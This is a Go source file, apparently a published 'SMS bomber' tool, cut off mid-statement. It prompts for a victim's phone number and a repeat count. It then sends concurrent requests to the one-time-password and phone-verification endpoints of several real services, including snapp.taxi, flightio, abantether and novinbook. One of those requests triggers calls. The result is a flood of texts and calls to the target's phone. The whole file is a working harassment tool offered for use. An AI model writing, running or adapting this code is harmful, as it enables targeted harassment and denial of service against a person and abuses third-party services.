package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
	"log"
	"sync"
)

/*
Channel telegram : none
===============================================
Link Github : https://github.com/monsmain
===============================================
Sms Bomber faster
*/
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func sms(url string, headers map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(headers)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(1 * time.Second) // کاهش زمان خواب برای سرعت بیشتر (قابل تنظیم)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	time.Sleep(1 * time.Second) // کاهش زمان خواب برای سرعت بیشتر (قابل تنظیم)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m") // Top (green)
	// ... (بخش ASCII Art شما)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	// ... (بخش ASCII Art شما)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	// ... (بخش ASCII Art شما)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color

	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)
	apiURLs := []string{
		"https://3tex.io/api/1/users/validation/mobile",
		"https://deniizshop.com/api/v1/sessions/login_request",
	}
	apiIndex := 0

	for i := 0; i < repeatCount; i++ {
		// استفاده چرخشی از دو API اول
		currentAPIURL := apiURLs[i%len(apiURLs)]
		var currentHeaders map[string]interface{}
		if currentAPIURL == "https://3tex.io/api/1/users/validation/mobile" {
			currentHeaders = map[string]interface{}{
				"receptorPhone": phone,
			}
		} else if currentAPIURL == "https://deniizshop.com/api/v1/sessions/login_request" {
			currentHeaders = map[string]interface{}{
				"mobile_phone": phone,
			}
		}
		go sms(currentAPIURL, currentHeaders, ch)
		apiIndex++

		// بقیه درخواست‌ها به APIهای دیگر (بدون تغییر)
		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			"userKey": phone,
		}, ch)
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
		go sms("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)
		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
			s57: phone,
		}, ch)
		go sms
